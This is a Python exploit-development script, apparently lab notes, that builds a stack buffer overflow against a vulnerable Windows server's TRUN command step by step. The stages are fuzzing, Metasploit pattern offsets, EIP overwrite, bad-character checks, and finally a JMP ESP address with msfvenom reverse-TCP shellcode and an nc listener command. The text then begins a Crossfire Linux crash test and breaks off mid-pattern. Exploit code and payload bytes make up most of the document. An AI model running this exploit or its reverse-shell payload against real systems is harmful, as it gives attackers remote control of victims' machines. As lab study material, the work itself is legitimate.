#!/usr/bin/python3 
# Test the server with the data that crashed it
# Before running these scripts, it could be possible to use SPIKE to identify if the application is vulnerable to a BoF
# To do so, create the spike scripts to be used with the  generic_tcp_send 
# generic_tcp_send [host] [port] [spike_script] [SKIPVAR] [SKIPSTR]
# check basic.spk or 0Help.spk to see how it works
# In case you need to convert from string to bytes use: bytes(test_string, 'utf-8')
# Inverse way: myvar.decode("utf-8")
import socket
import time 
import sys
import struct

# Replace it with the server address
host = "192.168.1.56"
# Replace this with the desired port
port = 9999
#Initial size to start looking where the server dies 
size = 100

print("Initial Test")
'''
# Calling the server with a specific value(the one that was identified in spike that caused the crash) to validate the server stops working
try:
    # Replaces this line with the data you want to send to the server after the connection is established
    #msg = "PUT THE MSG HERE"
    msg = b"TRUN /.:/" + A*800
    # Creates the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port)) 
    #Sends the message to the server
    s.send(msg) 
    #Reads the answer if any
    time.sleep(1)
    data = s.recv(1024)
    #s.close()

except:
    print (f"Server crashed with msg "+msg)
    sys.exit() 
'''

#Test
print("Test 1")

'''
# 1. Finding the approximated size that cause the overflow
# This is the initial part to identify how many chars can cause an overflow
# This part can be used if SPIKE was not used to identify if the application crashes
# If the EIP in the server contains 41414141 (AAAA) this means it is possible to be manipulated
while (True):
    try:
        print ("\nFuzzing system with %s bytes" % size )
        inputBuffer = b"A" * size 
        # Replaces this line with the data you want to send to the server after the connection is established
        payload = b"TRUN /.:/" + inputBuffer

        # Creates the socket and establish the connection to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port)) 
        #Sends the message to the server
        s.send(payload) 
        #Reads the answer if any
        data = s.recv(1024)
        time.sleep(1)
        #s.close()
        # Increases the size of the buffer 
        size+=100

    except:
        print (f"Fuzzing crashed at {str(len(buffer))} bytes.")
        sys.exit() 
'''

#Test
print("Test 2")

'''
# 2. Finding the exact offset where the EIP is replaced
# We need to generate a sequence of "random" chars to identify where it happens
# This pattern was created using this command: /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 5000 or msf-pattern_create -l 5000 in other kali
textpattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"
try:
    print ("\nFuzzing system with the pattern")
    payload = b"TRUN /.:/" + textpattern
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    s.connect((host, port)) 
    print("Sending the payload")
    s.send(payload) 
    data = s.recv(1024)
    s.close() 
except:
    print ("Fuzzing crashed")
    sys.exit() 
# After running this part, the EIP value should be noted. In this example was 386F4337
# Now use this command to identify the exact offset based on the EIP value
# /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 5000 -q 386F4337
# The answer received was: => [*] Exact match at offset 2003
'''
#Test
print("Test 3")

'''
# 3. Confirming the EIP can be manipulated by us
# Once the offset is identified
# Include here the size obtained from the pattern offset -1 
# Check it is working by running this part and validating EIP becomes 4242424242 (BBBB)
size = 2002
#This part to be used when the overflow is identified to determine the offset
textpattern = "A"*size
# This is to identify if it is little indian. Once it is determined, this values should be replaced by the desired return address
rand= b"Z"
# Here the value we want to assign to the EIP and EBP
eip = b"B"*4
ebp = b"C"*7
try:
    print ("\nFuzzing system with the pattern")
    buffer = b"TRUN /.:/" + textpattern + rand + eip + badchars
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    # Both parenthesis are required
    s.connect((host, port)) 
    print("Sending the payload")
    s.send(buffer) 
    print("Receiving the data")
    data = s.recv(1024)
    s.close() 

except:
    print ("Fuzzing crashed")
    sys.exit() 
'''
#Test
print("Test 4")

'''
# 4. Checking for badchars (not accepted by the server)
# Run the same than before but sending the badchars
size = 2002
textpattern = b"A"*size
rand= b"Z"
eip = b"B"*4
ebp = b"C"*10
# This part is used to identify if the server accepts all the values or if there are any "badchar" to avoid its use
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
try:
    print ("\nFuzzing system with the pattern")
    payload = b"TRUN /.:/" + textpattern + rand + eip + badchars
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    # Both parenthesis are required
    s.connect((host, port)) 
    data = s.recv(1024)
    print("Response: ",data)
    print("Sending the payload")
    s.send(payload) 
    print("Receiving the data")
    data = s.recv(1024)
    s.close() 

except Exception as err:
    print ("Fuzzing crashed: ")
    print (str(err))
    sys.exit() 
'''

'''
#Test 5
print("Test 5 shell exploit")


# Detect the right address for the EIP and run the shell!
# Now we know we can point EIP to the address we want and also we know we can left the payload in the ESP
# So we need to find an address where the JMP ESP call already exist using mona.py
# Download it from https://github.com/corelan/mona and copy the file into Immunity Debugger\PyCommands
# Run !mona modules in the textbox in the downside of the Immunity debugger window to identify insecure modules
# Look for JMP ESP ("\xff\xe4") in the insecure modules identified ("essfunc.dll" in this case)
# !mona find -s "\xff\xe4" -m "essfunc.dll"  => We identified 0x625011af in this case
# The shellcode can be generated using msvenom. It should not contain bad chars (if we found any)
# Using msfvenom in Linux, including the badchars to not be used. At least \x00 should be included:
# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
# Before running this code, we need to run a nc in the kali Linux to get the reverse shell: sudo nc -lnvp 443
#Same buffer
buffer = b"A"*2002
rand = b"Z"
#Address we want to point in little indian (inverse order) 0x625011af is now:
#eip = b"\xaf\x11\x50\x62"
eip = struct.pack('<L', 0x625011af)
shellcode = (b"\xda\xc3\xb8\x7e\xe5\x93\x6d\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
b"\x52\x83\xeb\xfc\x31\x43\x13\x03\x3d\xf6\x71\x98\x3d\x10\xf7"
b"\x63\xbd\xe1\x98\xea\x58\xd0\x98\x89\x29\x43\x29\xd9\x7f\x68"
b"\xc2\x8f\x6b\xfb\xa6\x07\x9c\x4c\x0c\x7e\x93\x4d\x3d\x42\xb2"
b"\xcd\x3c\x97\x14\xef\x8e\xea\x55\x28\xf2\x07\x07\xe1\x78\xb5"
b"\xb7\x86\x35\x06\x3c\xd4\xd8\x0e\xa1\xad\xdb\x3f\x74\xa5\x85"
b"\x9f\x77\x6a\xbe\xa9\x6f\x6f\xfb\x60\x04\x5b\x77\x73\xcc\x95"
b"\x78\xd8\x31\x1a\x8b\x20\x76\x9d\x74\x57\x8e\xdd\x09\x60\x55"
b"\x9f\xd5\xe5\x4d\x07\x9d\x5e\xa9\xb9\x72\x38\x3a\xb5\x3f\x4e"
b"\x64\xda\xbe\x83\x1f\xe6\x4b\x22\xcf\x6e\x0f\x01\xcb\x2b\xcb"
b"\x28\x4a\x96\xba\x55\x8c\x79\x62\xf0\xc7\x94\x77\x89\x8a\xf0"
b"\xb4\xa0\x34\x01\xd3\xb3\x47\x33\x7c\x68\xcf\x7f\xf5\xb6\x08"
b"\x7f\x2c\x0e\x86\x7e\xcf\x6f\x8f\x44\x9b\x3f\xa7\x6d\xa4\xab"
b"\x37\x91\x71\x7b\x67\x3d\x2a\x3c\xd7\xfd\x9a\xd4\x3d\xf2\xc5"
b"\xc5\x3e\xd8\x6d\x6f\xc5\x8b\x51\xd8\xc4\x28\x3a\x1b\xc6\xaf"
b"\x01\x92\x20\xc5\x65\xf3\xfb\x72\x1f\x5e\x77\xe2\xe0\x74\xf2"
b"\x24\x6a\x7b\x03\xea\x9b\xf6\x17\x9b\x6b\x4d\x45\x0a\x73\x7b"
b"\xe1\xd0\xe6\xe0\xf1\x9f\x1a\xbf\xa6\xc8\xed\xb6\x22\xe5\x54"
b"\x61\x50\xf4\x01\x4a\xd0\x23\xf2\x55\xd9\xa6\x4e\x72\xc9\x7e"
b"\x4e\x3e\xbd\x2e\x19\xe8\x6b\x89\xf3\x5a\xc5\x43\xaf\x34\x81"
b"\x12\x83\x86\xd7\x1a\xce\x70\x37\xaa\xa7\xc4\x48\x03\x20\xc1"
b"\x31\x79\xd0\x2e\xe8\x39\xe0\x64\xb0\x68\x69\x21\x21\x29\xf4"
b"\xd2\x9c\x6e\x01\x51\x14\x0f\xf6\x49\x5d\x0a\xb2\xcd\x8e\x66"
b"\xab\xbb\xb0\xd5\xcc\xe9")

# nops are just like go to the next memmory address.
nops = b"\x90"*8


try:
    print ("\Preparing the string with the reverse shell")
    payload = b"TRUN /.:/" + buffer + rand + eip + nops + shellcode
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    # Both parenthesis are required
    s.connect((host, port)) 
    data = s.recv(1024)
    print("Response: ",data)
    print("Sending the payload")
    s.send(payload) 
    print("Receiving the data")
    data = s.recv(1024)
    s.close() 

except Exception as err:
    print ("Fuzzing crashed: ")
    print (str(err))
    sys.exit() 

'''

#Linux part
host = "192.168.1.55"
port = 13327


#Test 6
print("Test 6 Linux Crossfire 1.9.0 server crash and identifying values in the registers and stack")
'''
# We know the app crashed with a buffer of 4379 so lets test it to observe what information is stored in the memory registers when the app crashes 
# This pattern was created using this command: /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 4379 or msf-pattern_create -l 4379 in other kali
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8D